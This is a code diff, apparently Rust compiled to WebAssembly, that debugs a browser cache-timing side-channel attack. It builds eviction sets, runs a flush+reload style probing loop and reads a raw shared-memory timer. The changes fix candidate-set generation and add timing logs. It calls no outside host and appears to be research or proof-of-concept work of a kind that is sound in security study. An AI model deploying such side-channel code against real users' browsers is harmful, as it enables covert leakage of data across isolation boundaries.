@@ -29,9 +29,12 @@ mod js {
     }
 }
 
+#[no_mangle]
 pub extern "C" fn get_time() -> u64 {
     unsafe {
-        core::ptr::read_unaligned(1 as *const i64) as u64
+        // core::ptr::read_unaligned(1 as *const i64) as u64
+        let t : u64 = *(1 as *const u64);
+        t
         // js::get_time()
     }
 }
@@ -93,13 +96,13 @@ fn generate_eviction_set(target: &[u8], probe: u32, candidate_set: &LinkedList<u
 
 fn generate_candidate_set(target: &[u8]) -> LinkedList<u32> {
     let number_of_candidates = target.len() / CACHE_LINE_SIZE;
-    let mut candidates : Vec<usize> = (0..number_of_candidates).collect();
+    let mut candidates : Vec<usize> = (0..number_of_candidates)
+        .map(|i| i * CACHE_LINE_SIZE)
+        .collect();
     (0..number_of_candidates)
         .map(|_| {
             let index : usize = (random() * ((candidates.len() - 1) as f64)) as usize;
-            let offset : u32 = candidates.swap_remove(index) as u32;
-            candidates.swap_remove(index);
-            offset
+            candidates.swap_remove(index) as u32
         })
         .collect()
 }
@@ -124,12 +127,6 @@ pub extern "C" fn my_dealloc(ptr: *mut u8, len: usize) {
 
 #[no_mangle]
 pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32, time_slot_size: u32, probes: *mut u32, probe_size: usize, target: *mut u8, target_size: usize) -> *mut u32 {
-    // log_2(&"time_slots:".into(), &JsValue::from_f64(time_slots as f64));
-    // log_2(&"threshold:".into(), &JsValue::from_f64(threshold as f64));
-    // log_2(&"wait_cycles:".into(), &JsValue::from_f64(wait_cycles as f64));
-    // log_2(&"time_slot_size:".into(), &JsValue::from_f64(time_slot_size as f64));
-    // log_1(&format!("probe: {:?}", probes.iter().cloned().collect::<Vec<u32>>()).into());
-    // log_1(&format!("probe: {:?}", target.len()).into());
     let target = unsafe { core::slice::from_raw_parts(target, target_size) };
     let probes = unsafe { core::slice::from_raw_parts(probes, probe_size) };
     log(threshold as u64);
@@ -139,7 +136,15 @@ pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32
     log(probes[0] as u64);
     log(probes[1] as u64);
     log(probes[2] as u64);
+    log(get_time() as u64);
+    log(get_time() as u64);
+    log(get_time() as u64);
+    log(get_time() as u64);
+    log(get_time() as u64);
+    log(get_time() as u64);
+
     let candidate_set : LinkedList<u32> = generate_candidate_set(target.as_ref());
+    log(1234);
     let eviction_sets : Vec<LinkedList<u32>> = probes //config.probes
         .iter()
         .map(|offset| generate_eviction_set(target.as_ref(), *offset, &candidate_set, threshold as u64))
@@ -153,6 +158,7 @@ pub extern "C" fn flush_reload(threshold: u32, time_slots: u32, wait_cycles: u32
                 .iter()
                 .map(|p| probe(target.as_ref(), *p) as u32)
                 .collect();
+
             evict(target.as_ref(), &conflict_set);
             while get_time() - start < time_slot_size as u64 {
                 wait(wait_cycles);
